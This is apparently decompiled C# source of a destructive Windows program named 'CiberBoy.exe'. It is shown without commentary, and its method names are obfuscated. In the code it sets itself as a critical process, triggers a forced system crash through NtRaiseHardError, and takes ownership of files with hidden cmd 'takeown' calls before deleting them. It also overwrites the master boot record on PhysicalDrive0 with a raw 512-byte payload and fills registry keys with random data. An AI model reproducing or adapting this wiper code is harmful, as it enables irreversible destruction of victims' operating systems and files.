...
internal class Class1
{
  ...
  public static void qelkTcrKp()
  {
    if (Class1.RtlAdjustPrivilege(19, true, false, out bool _) != 0)
      return;
    Class1.NtRaiseHardError(3735936685U /*0xDEADDEAD*/, 0U, 0U, 0U, 6U, out uint _);
  }
  ...
  public static void smethod_0()
  {
    if (Class1.smethod_1())
    {
      ...
      int int_1 = 1;
      uint num1 = Class1.NtSetInformationProcess(handle, 29, ref int_1, 4);
      if (num1 == 0U)
        return;
      int num2 = (int) MessageBox.Show("Could not set my process as critical!\nMaybe try disabling Windows Defender? " + num1.ToString(), "CiberBoy.exe", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      Class1.qelkTcrKp();
    }
    else
    {
      int num = (int) MessageBox.Show("Could you please be kind enough and run me as administrator?", "CiberBoy.exe", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      Class1.qelkTcrKp();
    }
  }
  ...
  public static void smethod_2()
  {
    while (true)
    {
      ...
      try
      {
        ...
        {
          FileName = "cmd.exe",
          Arguments = $"/c takeown /f{path} /r /d y",
          UseShellExecute = true,
          WindowStyle = ProcessWindowStyle.Hidden
        });
        File.Delete(path);
        Console.WriteLine("successfully deleted file: " + path, (object) ConsoleColor.DarkGreen);
      }
      catch (Exception ex)
      {
        Console.WriteLine("can't delete that file: " + ex?.ToString(), (object) ConsoleColor.Red);
      }
      Thread.Sleep(10);
    }
  }
  ...
  {
    byte[] byte_0 = new byte[512 /*0x0200*/]
    {
      (byte) 235,
      (byte) 0,
      (byte) 232,
    ...
    Class1.WriteFile(Class1.CreateFile("\\\\.\\PhysicalDrive0", 268435456U /*0x10000000*/, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero), byte_0, 512U /*0x0200*/, out uint _, IntPtr.Zero);
  }
  ...
  public static void smethod_4()
  {
    try
    {
      bool bool_0 = Class1.smethod_8((object) Environment.OSVersion.VersionString);
      string[] strArray = new string[48 /*0x30*/]
      {
      ...
      foreach (string str in strArray)
      {
        ...
        Thread thread = new Thread((ThreadStart) (() =>
        {
          try
          {
            if (!bool_0)
            {
              using (RegistryKey registryKey_0 = Class1.smethod_7(string_0))
              {
                if (registryKey_0 == null)
                  return;
                Console.WriteLine($"fanculo regedit: {string_0}...");
                Class1.smethod_6(registryKey_0, (RandomNumberGenerator) Class1.rngcryptoServiceProvider_0);
              }
            }
            else
              Class1.smethod_5(string_0);
          }
          catch
          {
          }
    ...
    RandomNumberGenerator randomNumberGenerator_0)
  {
    try
    {
      ...
      {
        if (!Class1.smethod_9(subKeyName))
        {
          using (RegistryKey registryKey_0_1 = registryKey_0.OpenSubKey(subKeyName, true))
          {
            if (registryKey_0_1 != null)
            {
              ...
              Class1.smethod_6(registryKey_0_1, randomNumberGenerator_0);
            }
          }
        }
      }
  ...
  private static RegistryKey smethod_7(string string_0)
  {
    return string_0.StartsWith("HKEY_LOCAL_MACHINE") ? Registry.LocalMachine.OpenSubKey(string_0.Substring(19), true) : (string_0.StartsWith("HKEY_CURRENT_USER") ? Registry.CurrentUser.OpenSubKey(string_0.Substring(18), true) : (!string_0.StartsWith("HKEY_USERS") ? (RegistryKey) null : Registry.Users.OpenSubKey(string_0.Substring(11), true)));
  }

  private static bool smethod_8(object object_0) => Environment.OSVersion.Version.Major >= 6;
